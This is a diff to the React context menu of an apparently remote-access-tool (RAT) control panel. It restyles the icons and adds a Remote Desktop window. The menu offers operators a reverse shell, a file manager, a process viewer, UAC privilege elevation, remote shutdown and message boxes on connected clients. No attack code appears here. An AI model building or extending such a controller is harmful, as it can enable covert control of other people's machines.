@@ -8,50 +8,74 @@ import {
   handleElevateCmd,
 } from "../rat/RATCommands";
 
+import {
+  IconSettings2,
+  IconDeviceDesktopCog,
+  IconPower,
+  IconPlugConnected,
+  IconFolder,
+  IconTerminal2,
+  IconCpu2,
+  IconWorld,
+  IconShieldUp,
+  IconMessage2,
+  IconRotate,
+  IconLogout2,
+  IconPlugConnectedX,
+  IconPlug,
+  IconShareplay,
+} from "@tabler/icons-react";
+
 const menuOptions = [
   {
-    label: "Dashboard",
-    icon: <i className="ri-dashboard-line ri-2x text-primary"></i>,
-    navigate: true,
-    path: "/clients/[addr]",
-  },
-  {
     label: "Manage",
-    icon: <i className="ri-settings-3-line ri-2x text-accent"></i>,
+    icon: <IconSettings2 size={24} />,
     options: [
       {
+        label: "Remote Desktop",
+        type: "remote-desktop",
+        icon: <IconShareplay size={24} />,
+        window: true,
+      },
+      {
         label: "File Manager",
-        icon: <i className="ri-folder-line ri-2x text-warning"></i>,
+        type: "file-manager",
+        icon: <IconFolder size={24} />,
         navigate: true,
-        path: "/clients/[addr]/files",
+        path: "/[addr]/files",
       },
       {
         label: "Reverse Shell",
-        icon: <i className="ri-terminal-box-line ri-2x text-error"></i>,
+        type: "reverse-shell",
+        icon: <IconTerminal2 size={24} />,
         navigate: true,
         path: "/clients/[addr]/shell",
       },
       {
         label: "Process Viewer",
-        icon: <i className="ri-cpu-line ri-2x text-info"></i>,
+        type: "process-viewer",
+        icon: <IconCpu2 size={24} />,
         navigate: true,
         path: "/clients/[addr]/process",
       },
       {
         label: "Visit Website",
-        icon: <i className="ri-global-line ri-2x text-primary"></i>,
+        type: "visit-website",
+        icon: <IconWorld size={24} />,
         navigate: false,
         modal: true,
         modalId: "visit_website_modal",
       },
       {
-        label: "Elevate Privileges (UAC)",
-        icon: <i className="ri-shield-line ri-2x text-warning"></i>,
+        label: "Elevate (UAC)",
+        type: "elevate-privileges",
+        icon: <IconShieldUp size={24} />,
         function: handleElevateCmd,
       },
       {
-        label: "Show MessageBox",
-        icon: <i className="ri-message-line ri-2x text-success"></i>,
+        label: "MessageBox",
+        type: "show-message-box",
+        icon: <IconMessage2 size={24} />,
         modal: true,
         modalId: "message_box_modal",
       },
@@ -60,23 +84,23 @@ const menuOptions = [
   },
   {
     label: "System",
-    icon: <i className="ri-computer-line ri-2x text-info"></i>,
+    icon: <IconDeviceDesktopCog size={24} />,
     options: [
       {
         label: "Shutdown",
-        icon: <i className="ri-shut-down-line ri-2x text-error"></i>,
+        icon: <IconPower size={24} />,
         run: "shutdown",
         function: handleSystemCommandCmd,
       },
       {
         label: "Reboot",
-        icon: <i className="ri-restart-line ri-2x text-warning"></i>,
+        icon: <IconRotate size={24} />,
         run: "reboot",
         function: handleSystemCommandCmd,
       },
       {
         label: "Log Out",
-        icon: <i className="ri-lock-line ri-2x text-info"></i>,
+        icon: <IconLogout2 size={24} />,
         run: "logout",
         function: handleSystemCommandCmd,
       },
@@ -85,17 +109,17 @@ const menuOptions = [
   },
   {
     label: "Connection",
-    icon: <i className="ri-link ri-2x text-base-content"></i>,
+    icon: <IconPlugConnected size={24} />,
     options: [
       {
         label: "Reconnect",
-        icon: <i className="ri-triangle-line ri-2x text-success"></i>,
+        icon: <IconPlug size={24} />,
         run: "reconnect",
         function: manageClientCmd,
       },
       {
         label: "Disconnect",
-        icon: <i className="ri-pentagon-line ri-2x text-error"></i>,
+        icon: <IconPlugConnectedX size={24} />,
         run: "disconnect",
         function: manageClientCmd,
       },
@@ -108,46 +132,58 @@ const SubMenu: React.FC<SubMenuProps> = ({
   top,
   left,
   addr,
+  clientFullName,
   navigate,
   onClose,
 }) => {
+  const { openClientWindow } = useContext(RATContext)!;
+
   return (
     <div
       style={{ top: `${top}px`, left: `${left + 2}px` }}
-      className="fixed shadow-lg border border-base-content rounded-md list-none flex flex-col text-center bg-base-200"
+      className="context-menu fixed shadow-lg border border-accent rounded-md list-none flex flex-col text-center bg-primarybg text-white z-50"
     >
-      {items.map((item, index) => (
-        <div
-          key={index}
-          onClick={() => {
-            if (item.navigate && typeof item.path === "string") {
-              navigate(item.path.replace("[addr]", addr));
-            }
-            if (
-              typeof item.function == "function" &&
-              typeof item.run === "string"
-            ) {
-              item.function(String(addr), item.run);
-            }
-            if (item.modal && typeof item.modalId === "string") {
-              (
-                document.getElementById(item.modalId) as HTMLDialogElement
-              )?.showModal();
-            }
-            if (
-              typeof item.function == "function" &&
-              typeof item.run === "undefined"
-            ) {
-              item.function(String(addr));
-            }
-            onClose();
-          }}
-          className="btn no-animation justify-normal w-full"
-        >
-          {item.icon}
-          {item.label}
-        </div>
-      ))}
+      {items.map((item, index) => {
+        const isLast = index === items.length - 1;
+
+        return (
+          <div
+            key={index}
+            onClick={() => {
+              if (item.window && typeof item.type === "string") {
+                openClientWindow(addr, item.type, clientFullName);
+              }
+              if (item.navigate && typeof item.path === "string") {
+                navigate(item.path.replace("[addr]", addr));
+              }
+              if (
+                typeof item.function === "function" &&
+                typeof item.run === "string"
+              ) {
+                item.function(String(addr), item.run);
+              }
+              if (item.modal && typeof item.modalId === "string") {
+                (
+                  document.getElementById(item.modalId) as HTMLDialogElement
+                )?.showModal();
+              }
+              if (
+                typeof item.function === "function" &&
+                typeof item.run === "undefined"
+              ) {
+                item.function(String(addr));
+              }
+              onClose();
+            }}
+            className={`context-menu flex-row gap-3 cursor-pointer flex w-full p-2 hover:bg-accent transition-all ${
+              isLast ? "" : "border-b border-accent "
+            }`}
+          >
+            {item.icon}
+            {item.label}
+          </div>
+        );
+      })}
     </div>
   );
 };
@@ -163,8 +199,8 @@ export const ContextMenu: React.FC<ContextMenuProps> = ({
   const navigate = useNavigate();
   const [activeIndex, setActiveIndex] = useState<number | null>(null);
   const [submenuPosition, setSubmenuPosition] = useState({ top: 0, left: 0 });
-  const itemRefs = useRef<(HTMLDivElement | null)[]>([]);
-  const [menuActive, setMenuActive] = useState(false);
+  const menuRef = useRef<HTMLDivElement>(null);
+  const submenuRef = useRef<HTMLDivElement>(null);
 
   useEffect(() => {
     setSelectedClient(clientFullName);
@@ -174,56 +210,90 @@ export const ContextMenu: React.FC<ContextMenuProps> = ({
     index: number,
     event: React.MouseEvent<HTMLDivElement, MouseEvent>
   ) => {
-    setMenuActive(true);
     setActiveIndex(index);
     const rect = event.currentTarget.getBoundingClientRect();
     setSubmenuPosition({ top: rect.top, left: rect.right });
   };
 
+  // Add an effect to handle clicks outside of the menu
+  useEffect(() => {
+    const handleClickOutside = (event: MouseEvent) => {
+      if (
+        menuRef.current &&
+        !menuRef.current.contains(event.target as Node) &&
+        submenuRef.current &&
+        !submenuRef.current.contains(event.target as Node)
+      ) {
+        setActiveIndex(null);
+      }
+    };
+
+    document.addEventListener("mousedown", handleClickOutside);
+    return () => {
+      document.removeEventListener("mousedown", handleClickOutside);
+    };
+  }, []);
+
+  // Close submenu when mouse leaves the menu area
   const handleMouseLeave = () => {
-    if (menuActive) return;
-    setActiveIndex(null);
+    // Use a small timeout to allow the mouse to move from main menu to submenu
+    setTimeout(() => {
+      const isOverSubMenu =
+        submenuRef.current && submenuRef.current.matches(":hover");
+
+      const isOverMainMenu =
+        menuRef.current && menuRef.current.matches(":hover");
+
+      if (!isOverSubMenu && !isOverMainMenu) {
+        setActiveIndex(null);
+      }
+    }, 50);
   };
 
   return (
-    <div
-      className={`fixed context-menu top-[${y}px] left-[${x}px] bg-base-200 border border-base-content rounded-md list-none flex flex-col text-center`}
-      style={{
-        top: `${y}px`,
-        left: `${x}px`,
-      }}
-    >
-      {menuOptions.map((option, index) => (
-        <div
-          key={index}
-          ref={(el) => (itemRefs.current[index] = el)}
-          className="btn no-animation flex justify-normal w-full"
-          onMouseEnter={(e) => handleMouseEnter(index, e)}
-          onMouseLeave={handleMouseLeave}
-          onClick={() => {
-            if (option.navigate && typeof option.path === "string") {
-              navigate(option.path.replace("[addr]", addr));
-            }
-            onClose();
-          }}
-        >
-          {option.icon}
-          {option.label}
-          {!option.navigate && option.options && (
-            <i className="ri-arrow-right-line ml-auto"></i>
-          )}
-        </div>
-      ))}
+    <>
+      <div
+        ref={menuRef}
+        className="fixed context-menu bg-primarybg border border-accent rounded-md list-none flex flex-col text-center text-white z-50"
+        style={{
+          top: `${y}px`,
+          left: `${x}px`,
+        }}
+        onMouseLeave={handleMouseLeave}
+      >
+        {menuOptions.map((option, index) => {
+          const isLast = index === menuOptions.length - 1;
+
+          return (
+            <div
+              key={index}
+              className={`flex-row gap-3 cursor-pointer flex w-full p-2 hover:bg-accent transition-all ${
+                isLast ? "" : "border-b border-accent"
+              }`}
+              onMouseEnter={(e) => handleMouseEnter(index, e)}
+            >
+              {option.icon}
+              {option.label}
+              {!option.navigate && option.options && (
+                <i className="ri-arrow-right-line ml-auto"></i>
+              )}
+            </div>
+          );
+        })}
+      </div>
       {activeIndex !== null && menuOptions[activeIndex].options && (
-        <SubMenu
-          items={menuOptions[activeIndex].options!}
-          top={submenuPosition.top}
-          left={submenuPosition.left}
-          addr={addr}
-          navigate={navigate}
-          onClose={onClose}
-        />
+        <div ref={submenuRef} onMouseLeave={handleMouseLeave}>
+          <SubMenu
+            items={menuOptions[activeIndex].options!}
+            top={submenuPosition.top}
+            left={submenuPosition.left}
+            addr={addr}
+            clientFullName={clientFullName}
+            navigate={navigate}
+            onClose={onClose}
+          />
+        </div>
       )}
-    </div>
+    </>
   );
 };
